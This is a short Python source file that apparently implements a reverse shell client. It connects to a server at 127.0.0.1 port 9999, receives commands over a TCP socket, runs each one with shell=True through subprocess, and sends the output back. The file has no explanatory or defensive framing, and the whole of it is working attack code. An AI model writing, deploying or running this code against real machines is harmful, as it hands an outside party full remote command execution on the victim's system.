import socket
import subprocess


def connect(server_ip,server_port):
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    while True:
        client.connect((server_ip,server_port))
        while True:
            command = client.recv(1024).decode()
            try:
                if command.strip() == "exit":
                    client.close()
                    break
                else:
                    CMD = subprocess.Popen(
                        command,
                        shell=True,
                        stdout=subprocess.PIPE,
                        stderr=subprocess.PIPE,
                        stdin=subprocess.PIPE,
                    )
                    client.send(CMD.stdout.read())
                    client.send(CMD.stderr.read())

            except Exception as e:
                print("Exception: {}".format(e))


def main():
    server_ip="127.0.0.1"
    server_port=9999
    connect(server_ip,server_port)


if __name__ == "__main__":
    main()
